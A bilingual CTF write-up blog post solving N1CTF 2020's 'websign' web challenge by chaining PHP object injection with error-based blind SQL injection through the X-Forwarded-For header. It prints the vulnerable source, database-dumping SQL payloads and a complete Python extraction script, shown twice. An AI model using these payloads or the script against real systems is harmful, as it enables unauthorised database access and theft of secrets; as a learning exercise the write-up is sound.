---
layout: "post"
title: "N1CTF: Web Sign-in and Beyond"
date: "2020-10-21 05:56:16"
date_gmt: "2020-10-21 05:56:16"
modified: "2020-10-21 05:59:24"
modified_gmt: "2020-10-21 05:59:24"
slug: "n1ctf-web-sign-in-and-beyond"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2020/10/21/n1ctf-web-sign-in-and-beyond/"
guid: "http://y4y.space/?p=214"
wordpress_id: 214
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
This will be my solution on the recent concluded N1CTF's easiest web challenge 'websign' which I couldn't even solve during the competition. I normally wouldn't bother post a blog but this time I felt I really had it in my hand and want to try again with the assistance of some writeups. Enjoy and hope you can learn something like I did.

中文部分在底下

## EN

## Challenge Description

101.32.205.189 (Server down already)

## Solution

By the time I wrote this, the server is already down. But all the page does was to show the code below.

```php
<?php
class ip {
    public $ip;
    public function waf($info){
    return $info;
    }
    public function __construct() {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $this->ip = $this->waf($_SERVER['HTTP_X_FORWARDED_FOR']);
        }else{
            $this->ip =$_SERVER["REMOTE_ADDR"];
        }
        echo "[*] ip in ip class ".$this->ip;
        echo "<br>\n";
    }
    public function __toString(){
        $con=mysqli_connect("localhost","root", "**********", "n1ctf_websign");
        $sqlquery=sprintf("INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')",$this->waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
        echo "[*] sqlquery ".$sqlquery."<br>\n";
        echo "[*] query result ".mysqli_query($con,$sqlquery)."<br>\n";
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return "your ip looks ok!";
        }
        mysqli_close($con);
    }
}

class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this->ip = $ip;
        echo "[*] ip inside __construct()<br>\n";
        echo $this->ip."<br>\n";
    }
    public function getflag(){
        if(md5($this->check)===md5("key****************")){
            readfile('flag');
        }
        return $this->ip;
    }
    public function __wakeup(){
        echo "[*] ip inside __wakeup():".$this->ip."\n";
        if(stristr($this->ip, "n1ctf")!==False)
            $this->ip = "welcome to n1ctf2020";
        else
            $this->ip = "noip";
    }
    public function __destruct() {
        echo "[*] getflag return: ".$this->getflag()."\n";
    }

}
if(isset($_GET['input'])){
    $input = $_GET['input'];
    unserialize($input);
}

?>
```

This is going to be a PHP unserialization problem.

The code above declares two PHP objects, a `flag` object and an `ip` object. Then in the end, it checks if the `GET` request has a `input` parameter, if it does, it will unserialize the object. That's all the code does.

First let's take a look at the `ip` object.

1. There is an `ip` attribute.
2. There is a WAF function which will filter some input.
3. The `construct` function checks if the HTTP request has the header `X-Forwarded-For` (XFF for short), if it does, set the `ip` value to be the value of `XFF` after being sanitized by `waf()` ; else it will set `ip` to be the value of request's IP address.
4. `toString` function defines how will the object return as a string. First it connect to the database, and insert the value of `ip` and `time()` result into database `n1ip` . Then it checks if the query will return an error, and return error message if there is one; else it returns a string. Finally it closes the connection to database.

Next, the `flag` object.

1. The `flag` object has two attributes: `ip` and `check` .
2. `construct` function requires a `ip` parameter as argument and will set `ip` value to be the value of argument passed in.
3. `getflag()` checks the value `check` with some secret key which is redacted for good reasons. Then it returns the value of `ip` of the object.
4. `wakeup` function is one of the PHP magic functions, it will pickup wherever is left in the suspended database connection and resume it. So in this function, it checks if the string 'n1ctf' is in the value of `ip` attribute, and returns different values depends on the result.
5. `destruct` function is called when an object is destoryed. In this very case, its functionality is self-explanatory.

Cool. What now? A few things to consider:

1. Both `ip` and `flag` object has an attribute called `ip` . And the `ip` object has a `toString` function so it can be returned as a string.
2. For some reason the `ip` value in `ip` will be inserted into database.
3. User has control of the `ip` value.
4. The value of secret is desired, maybe it's in the database or something.

The attack plan should be clear now, create an object `flag` and set its `ip` attribute to be the `ip` object in the very same file. Such that, a SQL injection can be performed, and leak the key in the database, otherwise, how are you going to the key? After key is obtained, let `check` attribute in `flag` be the value of key, and get flag.

The `flag` object is not hard to create, here is the file I wrote to generate such object. Spolier alert, the key will be there.

```php
<?php
class ip {
    public $ip;
    public function waf($info){
        return $info;
    }
    public function __construct() {
        $this->ip = 'n1ctf';
    }
    public function __toString(){
    }
}

class flag {
    public $ip;
    public $check = "n1ctf20205bf75ab0a30dfc0c";
    public function __construct($ip) {
        $this->ip = new ip();

    }
    public function getflag() {
        readfile('flag');
    }

    public function __wakeup() {
        $this->ip = 'n1ctf';
    }

}

$obj = new flag('asd');
echo serialize($obj);
echo "\n";

?>
```

Then `php ser.php` to run the file.

The injection part has nothing to do with the unserialization one as the value is taken from the header in HTTP request. And based on the code above, the injection will be error based and blind. To construct such payload, I need to make sure only one of the result will return an error, being either true or false.

I got stuck on this for a really time, so much so I didn't even come up with one during the competition. But deep in my heart I know I could've solved it because I should have the right approach. After the competition ends, I looked up the write-ups, but there were only two of which. One does not have a clear procedure, and another one relies on heavy query which will bring a lot burden onto server which is not desirable. I finally went with the clue in the first write up, here is the original [link](https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/signin).

The original writeup used this query:

```sql
'&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=2 limit 1)))))&&'
```

When `where 1=1` is set, it will error out and return `welcome to n1ctf`, else it will return `noip`. The `extractvalue()` function takes two arguments, `XML_frag` and `XPATH`. `XML_frag` is a fragment of XML expression and `XPATH` is an XPATH expression. So in the payload above, when the `where` clause is evaluated to be true, `n1ctf` will be the XPATH which then will result an error query.

One funny thing is, this exact payload can be found on PayAllTheThings. Surprised I did not notice that at all.

The `&&` operator is equivalent to `AND` in MySQL syntax. I believe the only way to concatenate string in MySQL is via `concat()` or `group_concat()`.

Back to the payload part, I need to do a blind injection to leak the database. And don't forget, there is also WAF to filter inputs. I tested and seems like `LIKE`, `SLEEP`, and `COUNT` are all prohibited. But I can use `SUBSTR` function which its functionality is self-explanatory. `SUBSTR` takes three arguments, the first being the string, the second being the offset(starting from 1 instead of 0), and the third being the offset. Obviously, the offset will be 1, and the input string will be the content I want to leak.

Now to construct the leaking query using `SUBSTR`. For example, I know `ip` is a column name in the table `n1ip`. So the following query

```sql
SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1;
```

will return `'i'`. Then I can do the comparison like `WHERE 1=1` to make it evaluate as true or false.

```sql
 WHERE (SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1)='i';
```

And this is how the database will be dumped. To dump schema names:

```sql
SELECT SUBSTR(SCHEMA_NAME, 1, 1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1;
```

To be clear, the `LIMIT` clause can take two arguments, the first is the index and the second of offset. In my case, the offset will be 1, and the index will change as I extract different schemas.

To dump table names:

```html
SELECT SUBSTR(TABLE_NAME, 1, 1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='<Table Schema>' LIMIT 0,1;
```

To dump column names:

```html
SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<Table Name>' LIMIT 0,1;
```

Finally to dump values from database:

```html
SELECT SUBSTR(<Column Name>, 1, 1) FROM <Table Name> LIMIT 0,1;
```

The rest is just to construct exploit script to do that automatically. The script will be included in Appendix section. I believe the code itself should say what it does, so I don't feel like explaining it. Basically it just iterate through a character set and checks the server response and then increament the index of extracted value if it has a hit.

After running the script, there is a database called `n1ctf_websign` as we saw in the source code. In the database there are two tables, `n1ip` and `n1key`. `n1key` has two columns, `id` and `key`. Since `key` is also a valid MySQL syntax, so when extract `key`, a backtic(`key`) has to be added to specify it's a column name.

## Flag

n1ctf{you_g0t_1t_hack_for_fun}

## Appendix

### exp.py

```html
#!/usr/bin/env python3

import requests
import string
import sys
import re

url = 'http://101.32.205.189/?input=O:4:"flag":2:{s:2:"ip";O:2:"ip":1:{s:2:"ip";N;}s:5:"check";N;}'
key_space = string.ascii_letters + string.digits + ','

# (select substr('ip', 1, 1))='2'
# true => n1ctf, fasle => noip

def req(payload):
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0',
            'X-Forwarded-For': payload
            }
    # proxies = {'http': '127.0.0.1:8080'}
    resp = requests.get(url, headers=headers)
    return resp.content.decode()

def extract_schema():
    known_schema = []
    cur_schema = ''
    col_count = 1
    row_count = 0
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(schema_name, {col_count}, 1) from information_schema.schemata limit {row_count}, 1)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_schema += cur_char
                sys.stdout.write(f'Got a hit! {cur_schema}')
                col_count += 1
                break
            elif 'hackhack' in resp:
                sys.stdout.write('hackhack!')
            else:
                sys.stdout.write(f'Trying schema {cur_schema + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('Reaching the end of cycle? Start next cycle.')
                    if len(cur_schema)==0:
                        sys.stdout.write('Reached the end of results. Can start next stage.')
                        sys.stdout.write('Found the following schemas:')
                        for j in known_schema:
                            sys.stdout.write(j)
                        finish = True
                    row_count += 1
                    known_schema.append(cur_schema)
                    cur_schema = ''
                    col_count = 1
                    break

def extract_tables():
    known_tables = ['n1ip']
    cur_tables = ''
    col_count = 1
    row_count = 1
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(table_name, {col_count}, 1) from information_schema.tables where table_schema='n1ctf_websign' limit {row_count}, 1)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_tables += cur_char
                print(f'Got a hit! {cur_tables}')
                col_count += 1
                break
            elif 'hackhack' in resp:
                print('hackhack!')
            else:
                sys.stdout.write(f'\rTrying table {cur_tables + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('\r\nReaching the end of cycle? Start next cycle.')
                    if len(cur_tables)==0:
                        print('Reached the end of results. Can start next stage.')
                        print('Found the following tables:')
                        for j in known_tables:
                            sys.stdout.write(j)
                        finish = True
                    row_count += 1
                    known_tables.append(cur_tables)
                    cur_tables = ''
                    col_count = 1
                    break

def extract_columns():
    known_columns = []
    cur_columns = ''
    col_count = 1
    row_count = 0
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(column_name, {col_count}, 1) from information_schema.columns where table_name='n1key' limit {row_count}, 1)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_columns += cur_char
                sys.stdout.write(f'\r\nGot a hit! {cur_columns}')
                col_count += 1
                break
            elif 'hackhack' in resp:
                sys.stdout.write('hackhack!')
            else:
                sys.stdout.write(f'\rTrying column {cur_columns + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('\r\nReaching the end of cycle? Start next cycle.')
                    if len(cur_columns)==0:
                        sys.stdout.write('\r\nReached the end of results. Can start next stage.')
                        sys.stdout.write('\r\nFound the following columns:\n')
                        for j in known_columns:
                            sys.stdout.write(f'\r\n{j}\n')
                        finish = True
                    row_count += 1
                    known_columns.append(cur_columns)
                    cur_columns = ''
                    col_count = 1
                    break

def extract_key():
    known_key = []
    cur_key = ''
    col_count = 1
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(`key`, {col_count}, 1) from n1key)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_key += cur_char
                col_count += 1
                break
            elif 'hackhack' in resp:
                sys.stdout.write('hackhack!')
            else:
                sys.stdout.write(f'\rTrying key {cur_key + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('\r\nReaching the end of cycle? Start next cycle.')
                    if len(cur_key)==0:
                        sys.stdout.write('\r\nReached the end of results. Can start next stage.')
                        sys.stdout.write('\r\nFound the following key:\n')
                        for j in known_key:
                            sys.stdout.write(f'\r\n{j}\n')
                        finish = True
                    row_count += 1
                    known_key.append(cur_key)
                    cur_key = ''
                    col_count = 1
                    break

def get_flag():
    url = 'http://101.32.205.189/?input=O:4:"flag":2:{s:2:"ip";O:2:"ip":1:{s:2:"ip";s:5:"n1ctf";}s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";}'
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0',
            'X-Forwarded-For': "', ''); n1ctf"
            }
    resp = requests.get(url, headers=headers).content.decode()
    flag = re.search('n1ctf\{.*?\}', resp).group(0)
    print(flag)

# extract_schema()
# extract_tables()
# extract_columns()
extract_key()
# get_flag()
```

## CN

## 题目描述

101.32.205.189 (服务器么的了)

## 解法

我做出来这道题的时候比赛已经结束了, 而且我在写这篇文章的时候服务器也没了. 但其实影响不大, 因为网页本身就显示源码而已. 以下是源码:

```php
<?php
class ip {
    public $ip;
    public function waf($info){
    return $info;
    }
    public function __construct() {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $this->ip = $this->waf($_SERVER['HTTP_X_FORWARDED_FOR']);
        }else{
            $this->ip =$_SERVER["REMOTE_ADDR"];
        }
        echo "[*] ip in ip class ".$this->ip;
        echo "<br>\n";
    }
    public function __toString(){
        $con=mysqli_connect("localhost","root", "**********", "n1ctf_websign");
        $sqlquery=sprintf("INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')",$this->waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
        echo "[*] sqlquery ".$sqlquery."<br>\n";
        echo "[*] query result ".mysqli_query($con,$sqlquery)."<br>\n";
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return "your ip looks ok!";
        }
        mysqli_close($con);
    }
}

class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this->ip = $ip;
        echo "[*] ip inside __construct()<br>\n";
        echo $this->ip."<br>\n";
    }
    public function getflag(){
        if(md5($this->check)===md5("key****************")){
            readfile('flag');
        }
        return $this->ip;
    }
    public function __wakeup(){
        echo "[*] ip inside __wakeup():".$this->ip."\n";
        if(stristr($this->ip, "n1ctf")!==False)
            $this->ip = "welcome to n1ctf2020";
        else
            $this->ip = "noip";
    }
    public function __destruct() {
        echo "[*] getflag return: ".$this->getflag()."\n";
    }

}
if(isset($_GET['input'])){
    $input = $_GET['input'];
    unserialize($input);
}

?>
```

于是乎这个是一个PHP反序列化的问题.

源码中声明了两个PHP类, 一个是`ip`, 另一个是`flag`. 然后反序列化HTTP GET请求的`input`变量.

首先看一下`ip`类.
1.有一个`ip`的变量

1. 有一个WAF函数来过滤一些用户输入
2. `construct` 函数会找HTTP的头部有没有 `X-Forward-For` 这么个东西, 有的话会把 `ip` 赋值成XFF的内容; 没有的话就是发送请求的IP地址.
3. `toString` 函数返回一个字符串类型的值, 在这里先连到数据库了, 往数据库里加 `ip` 和目前的时间. 如果报错那就返回报错的内容, 否则返回一个普通字符串.

接下来看一下`flag`类.

1. 这个类有两个变量, `ip` 和 `check` .
2. `construct` 函数需要一个 `ip` 变量, 然后把 `ip` 给赋值成传进来的值.
3. `getflag` 会把 `check` 的MD5值和一个key的值比较, 只有相同的结果才能读flag. 返回 `ip` 的值.
4. `wakeup` 函数会重新开始被暂停的数据库链接, 在这个函数里看 `ip` 的值包不包含 `n1ctf` , 然后根据返回结果给 `ip` 赋不同的值.
5. `destruct` 这个函数会在这个对象消失的时候执行, 这里是唤getflag函数.

那现在要考虑几件事情:

1. `ip` 和 `flag` 这两个类都有一个叫 `ip` 的变量, 并且 `ip` 类有个 `toString` 的函数.
2. `ip` 的值会被存到数据库里
3. 用户可以控制 `ip` 的值
4. 需要一个key的值, 但是源码里没给, 那是不是也在数据库里.

那目前的计划就很明了了, 先声明一个`flag`对象, 然后让`ip`类成为`flag`对象的`ip`值, 这样在被反序列化的时候这两个类都会被声明, 而且所有的内在函数也都可以被执行. 然后通过SQL注入来泄露key的值, 最后拿到flag. 完美.

以下是我弄`flag`类的脚本, 剧透一下, key的值也在里面.

```php
<?php
class ip {
    public $ip;
    public function waf($info){
        return $info;
    }
    public function __construct() {
        $this->ip = 'n1ctf';
    }
    public function __toString(){
    }
}

class flag {
    public $ip;
    public $check = "n1ctf20205bf75ab0a30dfc0c";
    public function __construct($ip) {
        $this->ip = new ip();

    }
    public function getflag() {
        readfile('flag');
    }

    public function __wakeup() {
        $this->ip = 'n1ctf';
    }

}

$obj = new flag('asd');
echo serialize($obj);
echo "\n";

?>
```

然后控制台`php ser.php`运行文件.

注入的部分和反序列化关系不大, 毕竟只是从HTTP的头部取值. 根据源码来看, 注入是根据报错信息而且是盲注.

我在注入这部分卡了一亿年, 直到比赛结束也没想出来, 虽然我也没做那么长时间…比赛结束后我看了下writeup, 但是我看的时候只有两个人发了. 第一个写的不明不白, 第二个用的heavy query我认为不太行. 最后还是看的第一个不明不白的writeup, 根据他上面描述的SQL语句我自己改造了一下拿去用了. [原文链接](https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/signin).

原SQL语句:

```sql
'&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=2 limit 1)))))&&'
```

当`where 1=1`的时候, 会报错然后根据报错结果会返回`welcome to n1ctf`, 不然的话就是`noip`. `extractvalue`函数需要两个参数, 第一个是XML的内容, 第二个是XPATH的表达式. 如果XPATH表达式有问题的话就会报错, 至少我是这么理解的.

比较有意思的是, 我在PayAllTheThings看到过这个payload, 但是我直接跳过了.

`&&`符号和`AND`一样, 没记错的话在MySQL里唯一能连接不同字符串的方法就是`concat`和`group_concat`吧.

那么回到payload这部分, 我需要个盲注来泄露整个数据库, 而且还有个WAF会过滤一些东西, 我看了一下`LIKE`, `SLEEP`和`COUNT`啥的都不行. 那最后我用的是`SUBSTR`, 返回部分字符串. 第一个参数是目标字符串, 第二个是要找的位置, 第三个是返回长度. 根据这道题的情况那肯定是返回一个字符.

接下来是用`SUBSTR`来构建剩下的payload, 比如说`ip`这行在`n1ip`这个表里, 所以一下的SQL语句应该返回`'i'`. 因为`'i'`是第一个字母嘛.

```sql
SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1;
```

然后就是像`WHERE 1=1`那样来一个一个泄露数据库.

```sql
WHERE (SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1)='i';
```

数据库的名字可以这么被搞出来:

```sql
SELECT SUBSTR(SCHEMA_NAME, 1, 1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1;
```

这个`LIMIT`也可以有两个参数, 第一个是位置, 第二个是返回多少个, 和`SUBSTR`同理, 肯定是返回一个.

泄露表名:

```html
SELECT SUBSTR(TABLE_NAME, 1, 1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='<Table Schema>' LIMIT 0,1;
```

泄露行的名字:

```html
SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<Table Name>' LIMIT 0,1;
```

最后的最后就是弄到key的值:

```html
SELECT SUBSTR(<Column Name>, 1, 1) FROM <Table Name> LIMIT 0,1;
```

剩下的部分就是写代码了, 代码在附录部分可以找到.

因为服务器没了, 所以就没截图了, 数据库的名字是`n1ctf_websign`, 里面有`n1ip` 和`n1key`两个表, 然后key在`n1key`这个表里. 因为`key`也是MySQL里的一个什么功能, 所以要是想泄露`key`需要加一个`在两边.

## flag

n1ctf{you_g0t_1t_hack_for_fun}

## 附录

### exp.py

```html
#!/usr/bin/env python3

import requests
import string
import sys
import re

url = 'http://101.32.205.189/?input=O:4:"flag":2:{s:2:"ip";O:2:"ip":1:{s:2:"ip";N;}s:5:"check";N;}'
key_space = string.ascii_letters + string.digits + ','

# (select substr('ip', 1, 1))='2'
# true => n1ctf, fasle => noip

def req(payload):
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0',
            'X-Forwarded-For': payload
            }
    # proxies = {'http': '127.0.0.1:8080'}
    resp = requests.get(url, headers=headers)
    return resp.content.decode()

def extract_schema():
    known_schema = []
    cur_schema = ''
    col_count = 1
    row_count = 0
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(schema_name, {col_count}, 1) from information_schema.schemata limit {row_count}, 1)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_schema += cur_char
                sys.stdout.write(f'Got a hit! {cur_schema}')
                col_count += 1
                break
            elif 'hackhack' in resp:
                sys.stdout.write('hackhack!')
            else:
                sys.stdout.write(f'Trying schema {cur_schema + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('Reaching the end of cycle? Start next cycle.')
                    if len(cur_schema)==0:
                        sys.stdout.write('Reached the end of results. Can start next stage.')
                        sys.stdout.write('Found the following schemas:')
                        for j in known_schema:
                            sys.stdout.write(j)
                        finish = True
                    row_count += 1
                    known_schema.append(cur_schema)
                    cur_schema = ''
                    col_count = 1
                    break

def extract_tables():
    known_tables = ['n1ip']
    cur_tables = ''
    col_count = 1
    row_count = 1
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(table_name, {col_count}, 1) from information_schema.tables where table_schema='n1ctf_websign' limit {row_count}, 1)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_tables += cur_char
                print(f'Got a hit! {cur_tables}')
                col_count += 1
                break
            elif 'hackhack' in resp:
                print('hackhack!')
            else:
                sys.stdout.write(f'\rTrying table {cur_tables + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('\r\nReaching the end of cycle? Start next cycle.')
                    if len(cur_tables)==0:
                        print('Reached the end of results. Can start next stage.')
                        print('Found the following tables:')
                        for j in known_tables:
                            sys.stdout.write(j)
                        finish = True
                    row_count += 1
                    known_tables.append(cur_tables)
                    cur_tables = ''
                    col_count = 1
                    break

def extract_columns():
    known_columns = []
    cur_columns = ''
    col_count = 1
    row_count = 0
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(column_name, {col_count}, 1) from information_schema.columns where table_name='n1key' limit {row_count}, 1)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_columns += cur_char
                sys.stdout.write(f'\r\nGot a hit! {cur_columns}')
                col_count += 1
                break
            elif 'hackhack' in resp:
                sys.stdout.write('hackhack!')
            else:
                sys.stdout.write(f'\rTrying column {cur_columns + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('\r\nReaching the end of cycle? Start next cycle.')
                    if len(cur_columns)==0:
                        sys.stdout.write('\r\nReached the end of results. Can start next stage.')
                        sys.stdout.write('\r\nFound the following columns:\n')
                        for j in known_columns:
                            sys.stdout.write(f'\r\n{j}\n')
                        finish = True
                    row_count += 1
                    known_columns.append(cur_columns)
                    cur_columns = ''
                    col_count = 1
                    break

def extract_key():
    known_key = []
    cur_key = ''
    col_count = 1
    finish = False
    while not finish:
        for i in range(len(key_space)):
            cur_char = key_space[i]
            base_query = f"(select substr(`key`, {col_count}, 1) from n1key)='{cur_char}'"
            query_sample = f"'&&(select extractvalue(rand(),concat(0x3a,((select 'n1ctf' from n1ip where ({base_query})=1 limit 1)))))&&'"
            resp = req(query_sample)
            if '<code>welcome to n1ctf2020</code>' in resp:
                cur_key += cur_char
                col_count += 1
                break
            elif 'hackhack' in resp:
                sys.stdout.write('hackhack!')
            else:
                sys.stdout.write(f'\rTrying key {cur_key + cur_char}')
                if i == (len(key_space) - 1):
                    sys.stdout.write('\r\nReaching the end of cycle? Start next cycle.')
                    if len(cur_key)==0:
                        sys.stdout.write('\r\nReached the end of results. Can start next stage.')
                        sys.stdout.write('\r\nFound the following key:\n')
                        for j in known_key:
                            sys.stdout.write(f'\r\n{j}\n')
                        finish = True
                    row_count += 1
                    known_key.append(cur_key)
                    cur_key = ''
                    col_count = 1
                    break

def get_flag():
    url = 'http://101.32.205.189/?input=O:4:"flag":2:{s:2:"ip";O:2:"ip":1:{s:2:"ip";s:5:"n1ctf";}s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";}'
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0',
            'X-Forwarded-For': "', ''); n1ctf"
            }
    resp = requests.get(url, headers=headers).content.decode()
    flag = re.search('n1ctf\{.*?\}', resp).group(0)
    print(flag)

# extract_schema()
# extract_tables()
# extract_columns()
extract_key()
# get_flag()
```

我编程全是用英语学得, 所以中文写起来跟吃了屎一样. 不过考虑到也要回国了所以趁机熟悉一下. 原本以为我修炼了一段时间可以答大部分Web题了, 结果我还是图样, 还是要学习一个. 不过总体来说感觉还好, 我的思路都是正确的, 要是比赛时候多看两眼可能真的能蒙出来...
{% endraw %}
